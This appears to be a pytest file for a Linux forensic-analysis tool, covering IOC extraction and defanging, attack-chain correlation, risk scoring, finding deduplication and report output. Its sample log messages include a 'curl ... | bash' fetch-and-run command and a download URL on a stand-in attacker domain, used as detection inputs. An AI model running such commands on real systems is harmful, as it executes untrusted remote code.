"""Step 8: IOC extraction, correlation, scoring, dedup/merge, report sections."""

from __future__ import annotations

import json
from datetime import UTC, datetime

from linuxdfir.correlate import correlate_findings
from linuxdfir.iocs import extract_iocs, is_internal_ip
from linuxdfir.merge import (
    apply_allowlist,
    apply_severity_overrides,
    merge_duplicate_findings,
    postprocess_findings,
)
from linuxdfir.schema import Event, Finding, Ref, Severity
from linuxdfir.score import score_findings

T1 = datetime(2026, 1, 2, 3, 0, 0, tzinfo=UTC)
T2 = datetime(2026, 1, 2, 3, 12, 0, tzinfo=UTC)
T3 = datetime(2026, 1, 2, 4, 0, 0, tzinfo=UTC)


def _event(**kw) -> Event:
    defaults = dict(
        timestamp_utc=None,
        host="test",
        user=None,
        source_artifact="test",
        event_type="test",
        message="",
        evidence_path="/test",
        line_or_offset=1,
    )
    defaults.update(kw)
    return Event(**defaults)


def _finding(
    rule="test_rule",
    severity=Severity.HIGH,
    title="t",
    description="d",
    mitre_ids=None,
    first_seen=None,
    refs=None,
    fid=None,
    count=1,
):
    from linuxdfir.schema import make_finding_id

    return Finding(
        id=fid or make_finding_id(rule, title),
        rule=rule,
        severity=severity,
        title=title,
        description=description,
        mitre_ids=list(mitre_ids or []),
        first_seen=first_seen,
        count=count,
        refs=refs or [Ref("/test", 1)],
    )


# ------------------------------------------------------------------ IOC


class TestIOCs:
    def test_buckets_and_types(self):
        events = [
            _event(
                message=(
                    "login failed for alice from 8.8.8.8 "
                    "c2 evil.example.com served "
                    "fetch http://evil.example.com/x.sh "
                    "local file /tmp/.x/x sha256 "
                    "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
                )
            ),
            _event(message="internal host 10.0.0.7 probed"),
        ]
        result = extract_iocs(events, [], {})
        external_values = {(e["type"], e["value"]) for e in result["external"]}
        internal_values = {(e["type"], e["value"]) for e in result["internal"]}
        assert ("ip", "8.8.8.8") in external_values
        assert ("ip", "10.0.0.7") in internal_values
        assert ("domain", "evil.example.com") in external_values
        assert ("url", "http://evil.example.com/x.sh") in external_values
        assert ("hash", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855") in external_values
        assert ("path", "/tmp/.x/x") in internal_values
        assert ("username", "alice") in internal_values

    def test_defanged_display(self):
        result = extract_iocs(
            [_event(message="curl http://203.0.113.9/x.sh | bash")], [], {}
        )
        urls = [e for e in result["external"] + result["internal"] if e["type"] == "url"]
        assert urls
        assert urls[0]["defanged"].startswith("hxxp://")
        assert "[.]" in urls[0]["defanged"]
        assert "http://" not in urls[0]["defanged"]

    def test_documentation_and_private_are_internal(self):
        assert is_internal_ip("203.0.113.9")
        assert is_internal_ip("192.0.2.1")
        assert is_internal_ip("10.1.2.3")
        assert is_internal_ip("127.0.0.1")
        assert not is_internal_ip("8.8.8.8")
        assert not is_internal_ip("1.1.1.1")

    def test_finding_text_scanned(self):
        findings = [
            _finding(
                rule="ssh_bruteforce_then_success",
                title="SSH brute force then success from 203.0.113.9",
                description="Successful ssh login as root from 203.0.113.9",
            )
        ]
        result = extract_iocs([], findings, {})
        values = {(e["type"], e["value"]) for e in result["internal"]}
        assert ("ip", "203.0.113.9") in values
        assert ("username", "root") in values

    def test_suppress_config(self):
        events = [_event(message="beacon to 8.8.8.8")]
        result = extract_iocs(events, [], {"ioc": {"suppress": ["8.8.8.8"]}})
        assert all(e["value"] != "8.8.8.8" for e in result["external"] + result["internal"])

    def test_sources_carry_refs(self):
        events = [_event(message="attack from 8.8.8.8", evidence_path="/var/log/auth.log", line_or_offset=9)]
        result = extract_iocs(events, [], {})
        entry = next(e for e in result["external"] if e["type"] == "ip")
        assert "/var/log/auth.log:9" in entry["sources"]


# ------------------------------------------------------------ correlation


class TestCorrelate:
    def test_chain_ordered_by_stage_then_time(self):
        findings = [
            _finding(
                rule="ssh_bruteforce_then_success",
                title="SSH brute force then success from 8.8.8.8",
                mitre_ids=["T1110.001", "T1078"],
                first_seen=T1,
            ),
            _finding(
                rule="login_anomalies",
                title="Login from brute-forced IP 8.8.8.8 as root",
                mitre_ids=["T1078"],
                first_seen=T2,
            ),
            _finding(
                rule="persistence_from_tmp_paths",
                title="Persistence from suspicious path: /tmp/.x/run.sh",
                description="cron job installed for root",
                mitre_ids=["T1053.003"],
                first_seen=T3,
            ),
        ]
        result = correlate_findings(findings, {})
        assert len(result["chains"]) == 1
        chain = result["chains"][0]
        titles = [step["title"] for step in chain["steps"]]
        assert titles[0].startswith("SSH brute force")
        assert "Login from" in titles[1]
        assert "Persistence" in titles[2]
        assert chain["confidence"] > 0.5
        assert "TA0001" in chain["tactic_ids"]
        assert "Initial Access" in chain["tactic_names"]

    def test_no_chain_when_disconnected(self):
        findings = [
            _finding(rule="a", title="alpha", first_seen=T1),
            _finding(rule="b", title="beta", first_seen=T2),
        ]
        result = correlate_findings(findings, {})
        assert result["chains"] == []
        assert sorted(result["unchained_finding_ids"]) == sorted(f.id for f in findings)

    def test_common_user_does_not_link(self):
        findings = [
            _finding(rule="a", title="for root one", first_seen=T1),
            _finding(rule="b", title="for root two", first_seen=T2),
        ]
        result = correlate_findings(findings, {"correlation": {"rare_user_max_findings": 1}})
        assert result["chains"] == []

    def test_min_chain_length(self):
        findings = [
            _finding(rule="a", title="from 8.8.8.8", first_seen=T1),
            _finding(rule="b", title="from 8.8.8.8", first_seen=T2),
        ]
        result = correlate_findings(findings, {"correlation": {"min_chain_length": 3}})
        assert result["chains"] == []

    def test_tactic_coverage(self):
        findings = [
            _finding(rule="a", title="x", mitre_ids=["T1078"]),
            _finding(rule="b", title="y", mitre_ids=["T1053.003"]),
        ]
        result = correlate_findings(findings, {})
        covered = {row["tactic_id"] for row in result["tactic_coverage"]}
        assert "TA0001" in covered
        assert "TA0003" in covered


# ---------------------------------------------------------------- scoring


class TestScore:
    def test_clean_score_low(self):
        findings = [_finding(rule="sshd_config_weakening", severity=Severity.LOW, title="weak sshd")]
        result = score_findings(findings, [], {})
        host = next(iter(result["hosts"].values()))
        assert host["score"] <= 10
        assert host["raw_score"] == 2

    def test_weights_and_cap(self):
        findings = [
            _finding(rule="a", severity=Severity.CRITICAL, title="crit"),
            _finding(rule="b", severity=Severity.HIGH, title="high"),
        ]
        result = score_findings(findings, [], {})
        host = next(iter(result["hosts"].values()))
        assert host["raw_score"] == 140
        assert host["score"] == 100
        assert host["by_severity"] == {"critical": 1, "high": 1}
        assert {row["rule"] for row in host["breakdown"]} == {"a", "b"}

    def test_config_weights_override(self):
        findings = [_finding(rule="a", severity=Severity.LOW, title="low")]
        result = score_findings(findings, [], {"scoring": {"weights": {"low": 50}}})
        host = next(iter(result["hosts"].values()))
        assert host["score"] == 50

    def test_user_scores_split(self):
        findings = [
            _finding(
                rule="a",
                severity=Severity.HIGH,
                title="for alice",
                description="compromised account for bob",
            ),
        ]
        result = score_findings(findings, [], {})
        assert result["users"]["alice"]["score"] == 20.0
        assert result["users"]["bob"]["score"] == 20.0

    def test_host_from_events(self):
        events = [_event(host="web01"), _event(host="web01"), _event(host="db01")]
        result = score_findings([], events, {})
        assert "web01" in result["hosts"]


# ------------------------------------------------------------- merge/dedup


class TestMerge:
    def test_same_path_same_technique_merges(self):
        findings = [
            _finding(
                rule="ld_preload_hijack",
                title="LD_PRELOAD hijack: /etc/ld.so.preload preloads 1 library",
                mitre_ids=["T1574.006"],
                fid="aaa111",
            ),
            _finding(
                rule="recent_changes_in_sensitive_paths",
                title="Recent change in sensitive path: /etc/ld.so.preload",
                mitre_ids=["T1574.006"],
                fid="bbb222",
            ),
        ]
        merged = merge_duplicate_findings(findings)
        assert len(merged) == 1
        kept = merged[0]
        assert {ref.evidence_path for ref in kept.refs} == {"/test"}
        assert kept.count == 2
        assert "recent_changes_in_sensitive_paths" in kept.description
        assert "ld_preload_hijack" in kept.rule

    def test_same_path_different_technique_kept(self):
        findings = [
            _finding(
                rule="timestomp_detection",
                title="Timestomp: /var/tmp/payload",
                mitre_ids=["T1070.006"],
            ),
            _finding(
                rule="executables_in_dev_shm",
                title="Executable: /var/tmp/payload",
                mitre_ids=["T1105"],
            ),
        ]
        merged = merge_duplicate_findings(findings)
        assert len(merged) == 2

    def test_severity_key_prevents_cross_severity_merge(self):
        findings = [
            _finding(
                rule="a",
                severity=Severity.HIGH,
                title="high /tmp/x",
                mitre_ids=["T1105"],
            ),
            _finding(
                rule="b",
                severity=Severity.LOW,
                title="low /tmp/x",
                mitre_ids=["T1105"],
            ),
        ]
        assert len(merge_duplicate_findings(findings)) == 2

    def test_allowlist_rule_wide(self):
        findings = [
            _finding(rule="sshd_config_weakening", severity=Severity.LOW, title="weak"),
            _finding(rule="other", title="keep"),
        ]
        out = apply_allowlist(findings, {"allowlist": {"findings": [{"rule": "sshd_config_weakening"}]}})
        assert [f.rule for f in out] == ["other"]

    def test_allowlist_title_contains(self):
        findings = [
            _finding(rule="login_anomalies", title="Unusual-hour login(s) for alice"),
            _finding(rule="login_anomalies", title="Login from brute-forced IP"),
        ]
        out = apply_allowlist(
            findings,
            {"allowlist": {"findings": [{"rule": "login_anomalies", "title_contains": "Unusual-hour"}]}},
        )
        assert len(out) == 1
        assert "brute-forced" in out[0].title

    def test_severity_override(self):
        findings = [_finding(rule="sshd_config_weakening", severity=Severity.LOW, title="weak")]
        out = apply_severity_overrides(findings, {"severity_overrides": {"sshd_config_weakening": "info"}})
        assert out[0].severity == Severity.INFO

    def test_postprocess_order(self):
        findings = [
            _finding(rule="a", severity=Severity.LOW, title="for alice: /tmp/x"),
            _finding(rule="b", severity=Severity.HIGH, title="for alice: /tmp/x", mitre_ids=["T1105"]),
            _finding(rule="a", severity=Severity.LOW, title="for alice: /tmp/x", mitre_ids=["T1105"]),
        ]
        # a stays LOW → different severity from b HIGH → no cross merge of a+b
        out = postprocess_findings(
            findings, {"severity_overrides": {"a": "high"}, "allowlist": {"findings": []}}
        )
        # all three now HIGH and same path /tmp/x; rule-a pair shares rule → merges; b shares T1105 → merges
        assert len(out) == 1
        assert out[0].count == 3


# --------------------------------------------------------------- fixtures


def _run_pipeline(generated, tmp_path, profile):
    from linuxdfir import cli

    archive = generated["results"][profile]["archive"]
    parsed = tmp_path / f"{profile}-parsed"
    assert cli.main(["parse", str(archive), "-o", str(parsed)]) == 0
    findings_out = tmp_path / f"{profile}-findings"
    assert cli.main(["detect", str(parsed), "-o", str(findings_out)]) == 0
    findings = json.loads((findings_out / "findings.json").read_text(encoding="utf-8"))
    iocs = json.loads((findings_out / "iocs.json").read_text(encoding="utf-8"))
    correlation = json.loads((findings_out / "correlation.json").read_text(encoding="utf-8"))
    risk = json.loads((findings_out / "risk.json").read_text(encoding="utf-8"))
    return findings, iocs, correlation, risk


class TestEndToEndStep8:
    def test_infected_narrative_order(self, generated, tmp_path):
        _findings, _iocs, correlation, _risk = _run_pipeline(generated, tmp_path, "infected")
        chains = correlation["chains"]
        assert chains, "infected host must produce at least one attack chain"
        best = max(chains, key=lambda chain: len(chain["steps"]))
        titles = [step["title"] for step in best["steps"]]
        brute = next(i for i, t in enumerate(titles) if "brute force" in t.lower())
        login = next(i for i, t in enumerate(titles) if t.startswith("Login from brute-forced"))
        assert brute < login, f"expected brute force before login, got: {titles}"
        account = [i for i, t in enumerate(titles) if "UID 0" in t or "account" in t.lower()]
        persistence = [i for i, t in enumerate(titles) if "Persistence from suspicious path" in t]
        scratch = [
            i
            for i, t in enumerate(titles)
            if "/tmp/" in t or "/dev/shm/" in t or "/var/tmp/" in t
        ]
        if account and persistence:
            assert account[0] < persistence[0], titles
        if persistence and scratch:
            assert min(persistence) < min(scratch), titles
        assert best["confidence"] > 0.5
        assert "TA0001" in best["tactic_ids"]
        assert len(best["steps"]) >= 4

    def test_infected_iocs(self, generated, tmp_path):
        _findings, iocs, _correlation, _risk = _run_pipeline(generated, tmp_path, "infected")
        all_entries = iocs["external"] + iocs["internal"]
        defanged = [e["defanged"] for e in all_entries]
        assert any(d.startswith("hxxp") for d in defanged), defanged[:10]
        assert any("[.]" in d for d in defanged)
        assert "http://" not in " ".join(defanged)
        internal_ips = {e["value"] for e in iocs["internal"] if e["type"] == "ip"}
        assert "203.0.113.9" in internal_ips
        domains = {e["value"] for e in iocs["external"] if e["type"] == "domain"}
        assert "github.com" in domains

    def test_infected_risk_and_refs(self, generated, tmp_path):
        findings, _iocs, _correlation, risk = _run_pipeline(generated, tmp_path, "infected")
        host = next(iter(risk["hosts"].values()))
        assert host["score"] == 100
        assert host["raw_score"] > 100
        assert risk["users"], "expected user attribution on infected host"
        rules = {f["rule"] for f in findings}
        assert "ld_preload_hijack" in rules
        ld = next(f for f in findings if f["rule"] == "ld_preload_hijack")
        paths = {ref["evidence_path"] for ref in ld["refs"]}
        assert len(paths) >= 1

    def test_clean_score_and_no_chain(self, generated, tmp_path):
        findings, _iocs, correlation, risk = _run_pipeline(generated, tmp_path, "clean")
        host = next(iter(risk["hosts"].values()))
        assert host["score"] <= 10
        assert correlation["chains"] == []
        assert len(findings) <= 2

    def test_report_sections(self, generated, tmp_path):
        from linuxdfir import cli

        archive = generated["results"]["infected"]["archive"]
        parsed = tmp_path / "parsed"
        assert cli.main(["parse", str(archive), "-o", str(parsed)]) == 0
        assert cli.main(["run", str(archive), "-o", str(tmp_path / "full")]) in (0, 2)
        page = (tmp_path / "full" / "report.html").read_text(encoding="utf-8")
        assert "Attack narrative" in page
        assert "Risk score" in page
        assert "hxxp" in page
        assert "What was not analyzed" in page
        assert "copy-btn" in page
        assert page.count("<script>") == 1
        assert "innerHTML" not in page

    def test_allowlist_e2e_zeroes_clean(self, generated, tmp_path):
        from linuxdfir import cli

        archive = generated["results"]["clean"]["archive"]
        parsed = tmp_path / "parsed"
        assert cli.main(["parse", str(archive), "-o", str(parsed)]) == 0
        cfg = tmp_path / "allow.toml"
        cfg.write_text(
            '[allowlist]\nfindings = [{ rule = "sshd_config_weakening" }]\n',
            encoding="utf-8",
        )
        findings_out = tmp_path / "findings"
        assert (
            cli.main(
                ["detect", str(parsed), "-o", str(findings_out), "--config", str(cfg)]
            )
            == 0
        )
        findings = json.loads((findings_out / "findings.json").read_text(encoding="utf-8"))
        risk = json.loads((findings_out / "risk.json").read_text(encoding="utf-8"))
        assert findings == []
        host = next(iter(risk["hosts"].values()))
        assert host["score"] == 0
